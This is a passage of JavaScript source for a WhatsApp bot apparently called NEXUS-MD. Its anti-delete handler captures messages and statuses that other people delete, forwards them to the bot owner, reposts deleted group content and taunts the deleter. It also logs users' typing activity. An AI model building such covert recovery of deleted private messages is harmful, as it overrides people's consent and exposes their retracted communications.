            console.log(`[ANTI-LEAVE] Could not re-add ${jid}: ${e.message}`);
          }
        }
      }
    }
  });

  // ── Universal anti-delete: recover ALL media types from groups, DMs and status ──
  sock.ev.on("messages.delete", async (item) => {
    if (!("keys" in item)) return;

    const mode    = settings.get("antiDeleteMode") || "off";
    const ownerDM = botPhoneNumber ? `${botPhoneNumber}@s.whatsapp.net` : null;

    // ── Shared helper — send recovered content to any destination JID ──────
    const sendRecovered = async (destJid, headerLabel, original, senderPhone, deleterJid) => {
      if (!destJid) return;
      try {
        const msgType = Object.keys(original.message || {})[0];
        if (!msgType || ["protocolMessage", "reactionMessage", "ephemeralMessage"].includes(msgType)) return;

        const BN       = settings.get("botName") || "NEXUS-MD";
        const now      = new Date();
        const dateStr  = now.toLocaleDateString("en-GB",  { day: "2-digit", month: "short",  year: "numeric" });
        const timeStr  = now.toLocaleTimeString("en-US",  { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: true });
        const deleterDisplay = deleterJid ? `+${deleterJid.split("@")[0].split(":")[0]}` : `+${senderPhone}`;
        const header =
          `🤖 *${BN} — Anti-Delete*\n` +
          `${"─".repeat(30)}\n` +
          `🗑 *${headerLabel}*\n` +
          `👤 *Sender:* +${senderPhone}\n` +
          `🗑 *Deleted by:* ${deleterDisplay}\n` +
          `📅 *Date:* ${dateStr}\n` +
          `🕐 *Time:* ${timeStr}`;

        // ── text ────────────────────────────────────────────────────────────
        const text = original.message?.conversation || original.message?.extendedTextMessage?.text;
        if (text) {
          await sock.sendMessage(destJid, {
            text: `${header}\n\n${text}`,
            mentions: deleterJid ? [deleterJid] : [],
          }).catch(() => {});
          return;
        }

        // ── media ───────────────────────────────────────────────────────────
        const MEDIA_TYPES = ["imageMessage","videoMessage","audioMessage","stickerMessage","documentMessage","ptvMessage"];
        if (!MEDIA_TYPES.includes(msgType)) {
          await sock.sendMessage(destJid, { text: `${header}\n\n_[${msgType.replace("Message","")} — could not retrieve content]_` }).catch(() => {});
          return;
        }

        const mediaBuf = await downloadMediaMessage(original, "buffer", {}).catch(() => null);
        if (!mediaBuf) {
          await sock.sendMessage(destJid, { text: `${header}\n\n_[Media could not be retrieved]_` }).catch(() => {});
          return;
        }

        const msgData  = original.message[msgType] || {};
        const caption  = (msgData.caption ? `\n_${msgData.caption}_` : "");

        if (msgType === "stickerMessage") {
          await sock.sendMessage(destJid, { sticker: mediaBuf }).catch(() => {});
          await sock.sendMessage(destJid, { text: `${header} _(sticker)_` }).catch(() => {});
        } else if (msgType === "audioMessage") {
          await sock.sendMessage(destJid, {
            audio:    mediaBuf,
            mimetype: msgData.mimetype || (msgData.ptt ? "audio/ogg; codecs=opus" : "audio/mpeg"),
            ptt:      msgData.ptt || false,
          }).catch(() => {});
          await sock.sendMessage(destJid, { text: `${header} _(${msgData.ptt ? "voice note" : "audio"})_` }).catch(() => {});
        } else if (msgType === "videoMessage" || msgType === "ptvMessage") {
          await sock.sendMessage(destJid, {
            video:    mediaBuf,
            caption:  `${header}${caption}`,
            mimetype: msgData.mimetype || "video/mp4",
            gifPlayback: msgData.gifPlayback || false,
          }).catch(() => {});
        } else if (msgType === "imageMessage") {
          await sock.sendMessage(destJid, {
            image:   mediaBuf,
            caption: `${header}${caption}`,
          }).catch(() => {});
        } else if (msgType === "documentMessage") {
          await sock.sendMessage(destJid, {
            document: mediaBuf,
            mimetype: msgData.mimetype || "application/octet-stream",
            fileName: msgData.fileName || "file",
            caption:  `${header}`,
          }).catch(() => {});
        }
      } catch {}
    };

    for (const key of item.keys) {
      if (!key.remoteJid) continue;
      const isStatus = key.remoteJid === "status@broadcast";
      const isGroup  = key.remoteJid.endsWith("@g.us");
      const isDM     = !isStatus && !isGroup;

      // ── Determine if this delete should be processed based on global mode ──
      const modeCoversStatus = ["status","all"].includes(mode);
      const modeCoversGroup  = ["group","both","all"].includes(mode);
      const modeCoversChat   = ["chat","both","all"].includes(mode);

      // ── STATUS delete ──────────────────────────────────────────────────────
      if (isStatus) {
        if (!modeCoversStatus) continue;
        const cached = security.getCachedStatus(key.id);
        if (!cached) continue;
        const original    = cached.msg;
        const ownerPhone  = (key.participant || original.key?.participant || "?").split("@")[0];
        if (ownerDM) {
          await sendRecovered(ownerDM, `Deleted Status — @${ownerPhone}`, original, ownerPhone, null);
        }
        continue;
      }

      // ── GROUP delete ───────────────────────────────────────────────────────
      if (isGroup) {
        const grpSettings  = security.getGroupSettings(key.remoteJid);
        const groupEnabled = grpSettings.antiDelete || modeCoversGroup;
        if (!groupEnabled) continue;
        const cached = security.getCachedMessage(key.id);
        if (!cached) continue;
        const original    = cached.msg;
        const senderPhone = (key.participant || original.key?.participant || "?").split("@")[0];
        const deleterJid  = key.participant || null;
        const label       = `Anti-Delete | Group`;

        // 1. Repost in the group
        await sendRecovered(key.remoteJid, label, original, senderPhone, deleterJid);
        // 2. Copy to owner DM
        if (ownerDM) await sendRecovered(ownerDM, `${label} — +${senderPhone}`, original, senderPhone, null);
        // 3. Warn the deleter privately
        if (deleterJid && !deleterJid.endsWith("@g.us")) {
          await sock.sendMessage(deleterJid, {
            text: `👀 *Anti-Delete Warning*\n\nYou deleted a message in a group and it was caught! 😏\n\n_The content has been forwarded to the group and the bot owner._`,
          }).catch(() => {});
        }
        continue;
      }

      // ── DM / PRIVATE CHAT delete ───────────────────────────────────────────
      if (isDM) {
        if (!modeCoversChat) continue;
        const cached = security.getCachedMessage(key.id);
        if (!cached) continue;
        const original    = cached.msg;
        const senderPhone = (key.remoteJid || "?").split("@")[0];
        const label       = `Anti-Delete | Chat`;

        // 1. Send to owner DM
        if (ownerDM) await sendRecovered(ownerDM, `${label} — +${senderPhone}`, original, senderPhone, null);
        continue;
      }
    }
  });

  sock.ev.on("presences.update", ({ id, presences }) => {
    for (const [jid, presence] of Object.entries(presences)) {
      if (presence.lastKnownPresence === "composing") {
        console.log(`✏️ ${jid.split("@")[0]} is typing in ${id.split("@")[0]}...`);
      }
    }
  });
}

db.init()
  .then(async () => {
    // Bootstrap all default settings into the DB so every key is persisted
    settings.initSettings();

    if (process.env.SESSION_ID) {
      // Always restore — universal detector handles all formats
      console.log("📦 Restoring WhatsApp session from SESSION_ID (universal)...");
      await restoreSession(process.env.SESSION_ID);
    }
    return startBot();
  })
  .catch((err) => {
    console.error("Fatal bot error:", err);
    process.exit(1);
  });
